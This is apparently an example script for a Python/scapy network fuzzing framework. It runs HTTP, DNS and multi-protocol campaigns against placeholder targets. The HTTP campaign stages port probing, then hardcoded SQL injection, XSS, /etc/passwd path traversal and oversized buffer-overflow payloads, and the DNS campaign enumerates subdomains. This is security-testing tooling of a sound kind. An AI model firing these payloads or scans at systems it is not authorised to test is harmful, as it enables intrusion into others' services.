#!/usr/bin/env python3
"""
Advanced Example 1: Complex Campaign Scenarios

Demonstrates advanced features including callback chains, response monitoring,
crash handling, and sophisticated mutator configurations.
"""

import sys
import os
import random
from typing import TYPE_CHECKING
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Raw
from scapy.layers.http import HTTP, HTTPRequest
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from fuzzing_framework import FuzzingCampaign, FuzzField, CallbackResult, CampaignContext

class AdvancedHTTPCampaign(FuzzingCampaign):
    """Multi-stage HTTP fuzzing with comprehensive monitoring."""
    name = "Advanced HTTP Fuzzing"
    target = "192.168.1.100"
    iterations = 15
    rate_limit = 2.0  # Controlled rate
    output_pcap = "advanced_http_complex.pcap"
    capture_responses = True
    verbose = True
    
    # Base packet for transformation
    packet = IP() / TCP() / HTTP() / HTTPRequest(Path=b"/", Method=b"GET", Host=b"target.com")
    
    def __init__(self):
        super().__init__()
        self.attack_stages = ["reconnaissance", "injection", "exploitation"]
        self.current_stage = 0
        self.packets_per_stage = 5
        self.stage_packet_count = 0
        self.discovered_ports = set()
        self.vulnerability_indicators = []
    
    def pre_send_callback(self, context, packet):
        """Multi-stage attack progression."""
        stage = self.attack_stages[self.current_stage]
        
        if stage == "reconnaissance":
            # Port scanning phase
            port = random.choice([80, 443, 8080, 8443, 3000, 9000, 9090, 8888])
            packet[TCP].dport = port
            packet[HTTPRequest].Host = f"target.com:{port}".encode()
            print(f"Reconnaissance: scanning port {port}")
            
        elif stage == "injection":
            # Injection testing phase
            payloads = [
                "GET /admin?id=1' OR '1'='1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "GET /file?path=../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n",
                "POST /login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 100\r\n\r\n" + "A" * 1000
            ]
            packet[Raw].load = random.choice(payloads).encode()
            print(f"Injection: testing payload")
            
        elif stage == "exploitation":
            # Exploitation phase
            buffer_sizes = [500, 1000, 2000, 4000, 8000]
            size = random.choice(buffer_sizes)
            packet[HTTPRequest].Path = b"/upload"
            packet[HTTPRequest].Method = b"POST"
            packet[HTTPRequest].Host = b"target.com"
            packet[Raw].load = b"A" * size
            packet[TCP].dport = 80
            packet[HTTPRequest].Content_Length = str(size).encode()
            print(f"Exploitation: buffer overflow test ({size} bytes)")
        
        self.stage_packet_count += 1
        
        # Advance to next stage
        if self.stage_packet_count >= self.packets_per_stage and self.current_stage < len(self.attack_stages) - 1:
            self.current_stage += 1
            self.stage_packet_count = 0
            print(f"Advancing to stage: {self.attack_stages[self.current_stage]}")
        
        return CallbackResult.SUCCESS
    
    def post_send_callback(self, context, packet, response=None):
        """Analyze responses for indicators."""
        if response and TCP in response:
            # Check for open ports
            if response[TCP].flags & 0x12:  # SYN-ACK
                port = packet[TCP].dport
                self.discovered_ports.add(port)
                print(f"Discovered open port: {port}")
            
            # Check for vulnerability indicators
            if hasattr(response, 'load') and response.load:
                indicators = [b"error", b"exception", b"debug", b"admin", b"root"]
                for indicator in indicators:
                    if indicator in response.load.lower():
                        self.vulnerability_indicators.append((packet.summary(), indicator.decode()))
                        print(f"Vulnerability indicator: {indicator.decode()}")
        return CallbackResult.SUCCESS
    
    def crash_callback(self, context: CampaignContext, packet, exception: Exception) -> None:
        """Handle crashes with detailed logging."""
        print(f"CRASH DETECTED in {self.__class__.__name__}")
        if packet and hasattr(packet, 'summary'):
            print(f"   Packet: {packet.summary()}")
        elif packet:
            print(f"   Packet: {str(packet)}")
        else:
            print(f"   Packet: None")
        print(f"   Exception: {str(exception)[:100]}")
        
        # Store crash information for analysis using shared_data
        if 'crashes' not in context.shared_data:
            context.shared_data['crashes'] = []
        context.shared_data['crashes'].append({
            'campaign': self.__class__.__name__,
            'exception': str(exception),
            'packet_summary': str(packet) if packet else "No packet"
        })

class AdvancedDNSCampaign(FuzzingCampaign):
    """DNS fuzzing with response analysis and subdomain enumeration."""
    name = "Advanced DNS Fuzzing"
    target = "10.10.10.10"
    iterations = 12
    output_pcap = "advanced_dns_complex.pcap"
    capture_responses = True
    verbose = True
    
    packet = IP() / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
    
    def __init__(self):
        super().__init__()
        self.subdomains = ["www", "mail", "ftp", "admin", "api", "test", "dev", "staging"]
        self.tlds = [".com", ".net", ".org", ".gov", ".mil"]
        self.query_types = [1, 2, 5, 15, 16, 28]  # A, NS, CNAME, MX, TXT, AAAA
        self.resolved_domains = []
    
    def pre_send_callback(self, context, packet):
        """Generate diverse DNS queries."""
        # Random subdomain enumeration
        subdomain = random.choice(self.subdomains)
        tld = random.choice(self.tlds)
        qname = f"{subdomain}.target{tld}"
        
        # Random query type
        qtype = random.choice(self.query_types)
        
        # Modify packet
        packet[DNS].qd.qname = qname.encode()
        packet[DNS].qd.qtype = qtype
        
        # Random transaction ID
        packet[DNS].id = random.randint(1, 65535)
        
        print(f"Querying {qname} (type {qtype})")
        
        return CallbackResult.SUCCESS
    
    def post_send_callback(self, context, packet, response=None):
        """Analyze DNS responses."""
        if response and DNS in response:
            query_name = packet[DNS].qd.qname.decode()
            
            # Check response code
            rcode = response[DNS].rcode
            if rcode == 0:  # NOERROR
                self.resolved_domains.append(query_name)
                print(f"Resolved: {query_name}")
            elif rcode == 3:  # NXDOMAIN  
                print(f"NXDOMAIN: {query_name}")
            else:
                print(f"Response code {rcode}: {query_name}")
            
            # Check for large responses (potential amplification)
            if len(bytes(response)) > 512:
                print(f"Large response ({len(bytes(response))} bytes) from {query_name}")
                context.shared_data['large_responses'] = context.shared_data.get('large_responses', 0) + 1
        
        return CallbackResult.SUCCESS

class AdvancedMultiProtocolCampaign(FuzzingCampaign):
    """Multi-protocol campaign with protocol switching."""
    name = "Multi-Protocol Advanced"
    target = "192.168.1.100"
    iterations = 10
    output_pcap = "advanced_multiprotocol.pcap"
    verbose = True
    
    packet = IP() / TCP() / HTTP() / HTTPRequest(Path=b"/", Method=b"GET")
    
    def __init__(self):
        super().__init__()
        self.protocols = ["HTTP", "HTTPS", "DNS", "SMTP", "SSH"]
        self.current_protocol = 0
        self.protocol_stats = {proto: 0 for proto in self.protocols}
    
    def pre_send_callback(self, context, packet):
        """Switch between different protocols."""
        protocol = self.protocols[self.current_protocol]
        self.protocol_stats[protocol] += 1
        
        if protocol == "HTTP":
            packet[TCP].dport = 80
            packet[HTTPRequest].Path = b"/api/v1/users"
            packet[HTTPRequest].Method = b"GET"
            packet[HTTPRequest].Host = b"target.com"
            
        elif protocol == "HTTPS":
            packet[TCP].dport = 443
            packet[Raw].load = b"\x16\x03\x01\x00\x01\x01"  # TLS handshake start
            
        elif protocol == "DNS":
            # Replace TCP with UDP for DNS
            packet = IP(dst=packet[IP].dst) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="target.com"))
            
        elif protocol == "SMTP":
            packet[TCP].dport = 25
            packet[Raw].load = b"EHLO attacker.com\r\n"
            
        elif protocol == "SSH":
            packet[TCP].dport = 22
            packet[Raw].load = b"SSH-2.0-OpenSSH_8.0 fuzzer\r\n"
        
        # Cycle through protocols
        self.current_protocol = (self.current_protocol + 1) % len(self.protocols)
        
        print(f"Protocol: {protocol} (port {packet[TCP].dport if TCP in packet else packet[UDP].dport})")
        
        return CallbackResult.SUCCESS

# Campaign registry
CAMPAIGNS = [
    AdvancedHTTPCampaign,
    AdvancedDNSCampaign,
    AdvancedMultiProtocolCampaign
]
def main():
    """Run advanced campaign examples."""
    print("=== Advanced Example 1: Complex Campaign Scenarios ===")
    print("Demonstrates multi-stage attacks, response monitoring, and crash handling")
    print()
    
    print("Advanced Features:")
    print("   • Multi-stage attack progression")
    print("   • Response analysis and monitoring")  
    print("   • Crash detection and handling")
    print("   • Protocol switching and adaptation")
    print()
    
    results = []
    for campaign_class in CAMPAIGNS:
        campaign = campaign_class()
        
        print(f"Running {campaign.name}")
        print(f"   Target: {campaign.target}")
        print(f"   Iterations: {campaign.iterations}")
        
        result = campaign.execute()
        results.append(result)
        
        if result:
            print(f"   Success - {campaign.output_pcap}")
            
            # Show campaign-specific stats
            if hasattr(campaign, 'discovered_ports') and campaign.discovered_ports:
                print(f"Discovered ports: {sorted(campaign.discovered_ports)}")
            
            if hasattr(campaign, 'resolved_domains') and campaign.resolved_domains:
                print(f"Resolved domains: {len(campaign.resolved_domains)}")
            
            if hasattr(campaign, 'vulnerability_indicators') and campaign.vulnerability_indicators:
                print(f"Vulnerability indicators: {len(campaign.vulnerability_indicators)}")
            
            if hasattr(campaign, 'protocol_stats') and campaign.protocol_stats:
                stats = [f"{k}:{v}" for k, v in campaign.protocol_stats.items() if v > 0]
                print(f"Protocol stats: {', '.join(stats)}")
        else:
            print(f"   Failed")
        print()
    
    success_count = sum(results)
    print(f"Summary: {success_count}/{len(CAMPAIGNS)} campaigns successful")
    
    print("\nAdvanced Techniques Demonstrated:")
    print("   • Multi-stage attack workflows")
    print("   • Dynamic packet modification")
    print("   • Response pattern analysis")
    print("   • Cross-protocol fuzzing")
    print("   • Comprehensive crash handling")
    
    return all(results)

if __name__ == "__main__":
    main()
